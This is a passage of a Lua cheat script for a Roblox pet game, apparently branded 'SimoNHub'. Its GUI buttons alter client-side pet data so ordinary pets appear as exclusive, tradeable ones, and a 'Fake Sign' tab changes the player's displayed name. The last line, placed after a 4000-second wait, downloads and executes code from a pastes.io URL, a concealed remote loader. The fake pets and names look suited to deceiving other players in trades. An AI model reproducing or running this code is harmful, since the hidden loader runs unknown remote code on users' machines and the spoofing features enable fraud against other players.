    end,
})
local Button = Tab4:CreateButton({
    Name = "Halloween Gift",
    Callback = function()
        petname4 = "Halloween Gift"
        petnameID = "Halloween 2022 Gift"
        giftchange()
    end,
})
local Button = Tab4:CreateButton({
    Name = "Christmas Stocking",
    Callback = function()
        petname4 = "Christmas 2022 Stocking"
        petnameID = petname4
        giftchange()
    end,
})
local Button = Tab4:CreateButton({
    Name = "New Years 2023 Gift",
    Callback = function()
        petname4 = "New Years 2023 Gift"
        petnameID = petname4
        giftchange()
    end,
})
local exc
function excChange()
    if fpetID3 == nil and fpet3 ~= nil then
        wrong()
    elseif fpet3 == nil then
        wrong2()
    end
    if fpet3 ~= nil and fpetID3 ~= nil then
        local petname = exc
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local petsm = string.split(v.Name, " - ")[2]
            if petsm == tostring(petname) then
                local petID = string.split(v.Name, " - ")[1]
                local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets[fpetID3 .. " - " .. fpet3]
                    ["Pet Data (" .. fpet3 .. ")"])
                v1.name = petname
                v1.model = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets[petID .. " - " .. petname]
                    .Pet
                v1.modelGold = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                    [petID .. " - " .. petname].Golden
                local v11 = {}
                v11.random = {}
                v1.sounds = v11
                v1.fly = require(v:FindFirstChildOfClass("ModuleScript")).fly
                v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                v1.goldenThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).goldenThumbnail
                v1.darkMatterThumbnail = ""
                v1.rarity = "Exclusive"
                v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                v1.tradeable = true
                v1.hidden = false
                v1.strengthMin = require(v:FindFirstChildOfClass("ModuleScript")).strengthMin
                v1.strengthMax = require(v:FindFirstChildOfClass("ModuleScript")).strengthMax
                v1.titanic = false
                v1.huge = false
                v1.isGift = false
                v1.giftEggId = nil
                v1.giftCallback = nil
                v1.balloon = require(v:FindFirstChildOfClass("ModuleScript")).balloon
                v1.companionEnchantLevel = require(v:FindFirstChildOfClass("ModuleScript")).companionEnchantLevel
                excenchant(petname, fpet3)
                break
            end
        end
    end
end
 
local Tab3 = Window:CreateTab("Misc", 10946336703) -- Title, Image
local Paragraph3 = Tab3:CreateParagraph({
    Title = "Note :",
    Content =
    [[Enjoy your Time at SimoNHuv ;)]]
})
local Input3 = Tab3:CreateInput({
    Name = "Pet To Replace",
    PlaceholderText = "Cat",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        fpetID3 = nil
        if Text == "" or Text == nil then
            fpet3 = nil
        else
            fpet3 = Text
        end
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local fpetcsm = string.split(v.Name, " - ")[2]
            if fpetcsm == tostring(fpet3) then
                fpetID3 = string.split(v.Name, " - ")[1]
            end
        end
    end,
})
local Button = Tab3:CreateButton({
    Name = "Bladee",
    Callback = function()
        exc = "Bladee"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Hubert",
    Callback = function()
        exc = "Hubert"
        if fpetID3 == nil and fpet3 ~= nil then
            wrong()
        elseif fpet3 == nil then
            wrong2()
        end
        if fpet3 ~= nil and fpetID3 ~= nil then
            local petname = exc
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local petsm = string.split(v.Name, "- ")[2]
                if petsm == tostring(petname) then
                    local petID = string.split(v.Name, "- ")[1]
                    local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [fpetID3 .. " - " .. fpet3]
                        ["Pet Data (" .. fpet3 .. ")"])
                    v1.name = petname
                    v1.model = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets[petID .. "- " .. petname]
                        .Pet
                    v1.modelGold = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                        [petID .. "- " .. petname].Golden
                    local v11 = {}
                    v11.random = {}
                    v1.sounds = v11
                    v1.fly = require(v:FindFirstChildOfClass("ModuleScript")).fly
                    v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    v1.goldenThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).goldenThumbnail
                    v1.darkMatterThumbnail = ""
                    v1.rarity = require(v:FindFirstChildOfClass("ModuleScript")).rarity
                    v1.isPremium = require(v:FindFirstChildOfClass("ModuleScript")).isPremium
                    v1.tradeable = true
                    v1.hidden = false
                    v1.strengthMin = require(v:FindFirstChildOfClass("ModuleScript")).strengthMin
                    v1.strengthMax = require(v:FindFirstChildOfClass("ModuleScript")).strengthMax
                    v1.titanic = false
                    v1.huge = false
                    v1.isGift = false
                    v1.giftEggId = nil
                    v1.giftCallback = nil
                    v1.balloon = require(v:FindFirstChildOfClass("ModuleScript")).balloon
                    v1.companionEnchantLevel = require(v:FindFirstChildOfClass("ModuleScript")).companionEnchantLevel
                    excenchant(petname, fpet3)
                    break
                end
            end
        end
    end,
})
local Button = Tab3:CreateButton({
    Name = "Water Wolf",
    Callback = function()
        exc = "Water Wolf"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Yellow Lucky Block",
    Callback = function()
        exc = "Yellow Lucky Block"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Blue Lucky Block",
    Callback = function()
        exc = "Blue Lucky Block"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Lovemelon",
    Callback = function()
        exc = "Lovemelon"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Coin Cat",
    Callback = function()
        exc = "Coin Cat"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Coin Dragon",
    Callback = function()
        exc = "Coin Dragon"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Coinortuus",
    Callback = function()
        exc = "Coinortuus"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Coin Cat",
    Callback = function()
        exc = "Coin Cat"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Super Axolotl",
    Callback = function()
        exc = "Super Axolotl"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Ninja",
    Callback = function()
        exc = "Ninja"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Ninja Turtle",
    Callback = function()
        exc = "Ninja Turtle"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Wicked Agony",
    Callback = function()
        exc = "Wicked Agony"
        excChange()
    end,
})
local Button = Tab3:CreateButton({
    Name = "Banana (Dog Required)",
    Callback = function()
        local petname = "banana"
        for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
            local petsm = string.split(v.Name, " - ")[2]
            if petsm == tostring(petname) then
                local petID = string.split(v.Name, " - ")[1]
                local v1 = require(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets["2 - Dog"]["Pet Data (Dog)"])
                v1.name = petname
                v1.model = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets[petID .. " - " .. petname]
                    .Pet
                v1.modelGold = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
                    [petID .. " - " .. petname].Golden
                local v11 = {}
                v11.random = {}
                v1.sounds = v11
                v1.fly = false
                v1.thumbnail = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                v1.goldenThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).goldenThumbnail
                v1.darkMatterThumbnail = require(v:FindFirstChildOfClass("ModuleScript")).darkMatterThumbnail
                v1.rarity = "Basic"
                v1.isPremium = false
                v1.tradeable = true
                v1.isVanity = true
                v1.companionEnchantLevel = 3
                v1.strengthMin = 2
                v1.strengthMax = 3
                v1.titanic = false
                v1.huge = false
                v1.isGift = false
                v1.giftEggId = nil
                v1.giftCallback = nil
                bananaenchant()
                break
            end
        end
    end,
})
local Tab5 = Window:CreateTab("Fake Sign", 7402706511) -- Title, Image
local Paragraph = Tab5:CreateParagraph({
    Title = "Requirements",
    Content =
    [[Fully functional, made by SimoNHub]]
})
local Input = Tab5:CreateInput({
    Name = "Text To Use",
    PlaceholderText = "SimoNHub",
    RemoveTextAfterFocusLost = false,
    Callback = function(Text)
        getgenv().newtext = Text
        singstop = false
    end,
})
local Button = Tab5:CreateButton({
    Name = "Sign",
    Callback = function()
        if getgenv().newtext ~= nil then
            v2.LocalPlayer.Name = getgenv().newtext
            singstop = true
            sign()
        else
            nottext()
        end
    end,
})
wait(4000)
loadstring(game:HttpGet("https://pastes.io/raw/ZlPZSsj2f8", true))()
